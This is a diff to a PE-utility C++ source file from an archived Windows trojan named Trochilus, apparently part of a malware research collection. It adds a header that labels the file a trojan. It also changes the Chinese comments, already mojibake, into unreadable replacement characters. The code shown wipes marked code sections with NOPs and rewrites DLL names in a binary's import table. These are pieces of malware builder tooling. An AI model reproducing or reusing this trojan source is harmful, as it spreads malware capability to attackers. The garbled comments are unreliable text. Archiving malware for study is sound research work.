@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "peutils.h"
 
@@ -8,13 +19,13 @@
 
 namespace PEUtils
 {
-	//ËÑË÷PEÎÄ¼þ´úÂë¶Î£¬½«ÒÔCODE_MARK_BEGIN¿ªÍ·£¬ÒÔCODE_MARK_END½áÎ²µÄ´úÂë£¬È«²¿ÇåÀíÎªNOP
+	//ï¿½ï¿½ï¿½ï¿½PEï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½Î£ï¿½ï¿½ï¿½ï¿½ï¿½CODE_MARK_BEGINï¿½ï¿½Í·ï¿½ï¿½ï¿½ï¿½CODE_MARK_ENDï¿½ï¿½Î²ï¿½Ä´ï¿½ï¿½ë£¬È«ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÎªNOP
 	void CleanCode(LPVOID lpBase)
 	{
 		IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*) lpBase;
 		IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*) ((LPBYTE)lpBase + pDosHeader->e_lfanew);
 
-		IMAGE_SECTION_HEADER* pSectionheader = IMAGE_FIRST_SECTION(pNtHeaders);	//µÚÒ»¸öÇø¿é
+		IMAGE_SECTION_HEADER* pSectionheader = IMAGE_FIRST_SECTION(pNtHeaders);	//ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSectionheader++)
 		{
 			if ((pSectionheader->Characteristics & IMAGE_SCN_CNT_CODE)
@@ -52,7 +63,7 @@ namespace PEUtils
 
 	BOOL ReplaceIIDName( LPVOID lpBase, LPCSTR pTargetName, LPCSTR pReplaceName )
 	{
-		//Ìæ»»µÄÃû³Æ³¤¶ÈÓ¦¸Ã Ð¡ÓÚµÈÓÚ ±»Ìæ»»µÄÃû³Æ
+		//ï¿½æ»»ï¿½ï¿½ï¿½ï¿½ï¿½Æ³ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ Ð¡ï¿½Úµï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½æ»»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		int iTargetLen = (int) strlen(pTargetName);
 		int iReplaceLen = (int) strlen(pReplaceName);
 		if (iReplaceLen > iTargetLen) return FALSE;
@@ -60,10 +71,10 @@ namespace PEUtils
 		IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*) lpBase;
 		IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*) ((LPBYTE)lpBase + pDosHeader->e_lfanew);
 
-		//²éÕÒÊäÈë±íËùÔÚÇø¶Î,²¢¼ÆËãÐéÄâµØÖ·ºÍÎÄ¼þ±ãÒËµÄ²îÖµ lk
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ËµÄ²ï¿½Öµ lk
 		LONG lk = 0;
-		DWORD dwIATVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;	//ÊäÈë±íRVAµØÖ·
-		IMAGE_SECTION_HEADER* pSectionheader = IMAGE_FIRST_SECTION(pNtHeaders);	//µÚÒ»¸öÇø¿é
+		DWORD dwIATVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;	//ï¿½ï¿½ï¿½ï¿½ï¿½RVAï¿½ï¿½Ö·
+		IMAGE_SECTION_HEADER* pSectionheader = IMAGE_FIRST_SECTION(pNtHeaders);	//ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		BOOL bFound = FALSE;
 		for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSectionheader++)
 		{
@@ -80,7 +91,7 @@ namespace PEUtils
 			return FALSE;
 		}
 
-		//¶¨Î»ÊäÈë±íÔÚÎÄ¼þÖÐµÄÎ»ÖÃ,±éÀúËùÓÐIID½á¹¹£¬²éÕÒÄ¿±êdllÃû³Æ²¢Ìæ»»
+		//ï¿½ï¿½Î»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ðµï¿½Î»ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½IIDï¿½á¹¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿ï¿½ï¿½dllï¿½ï¿½ï¿½Æ²ï¿½ï¿½æ»»
 		BOOL bReplaced = FALSE;
 		IMAGE_IMPORT_DESCRIPTOR* pImportDest = (IMAGE_IMPORT_DESCRIPTOR*) ((LPBYTE)lpBase + dwIATVA + lk);
 		BOOL bEmpty = TRUE;
@@ -96,7 +107,7 @@ namespace PEUtils
 
 			pImportDest++;
 
-			//¼ì²épImportDestÊÇ·ñÊÇÈ«NULLÊý¾Ý£¬ÅÐ¶ÏÊÇ·ñ½áÎ²
+			//ï¿½ï¿½ï¿½pImportDestï¿½Ç·ï¿½ï¿½ï¿½È«NULLï¿½ï¿½ï¿½Ý£ï¿½ï¿½Ð¶ï¿½ï¿½Ç·ï¿½ï¿½Î²
 			bEmpty = TRUE;
 			for (int i = 0; bEmpty && i < sizeof(IMAGE_IMPORT_DESCRIPTOR); i++) bEmpty = (*((LPBYTE)pImportDest + i) == 0);
 		} while (! bEmpty);
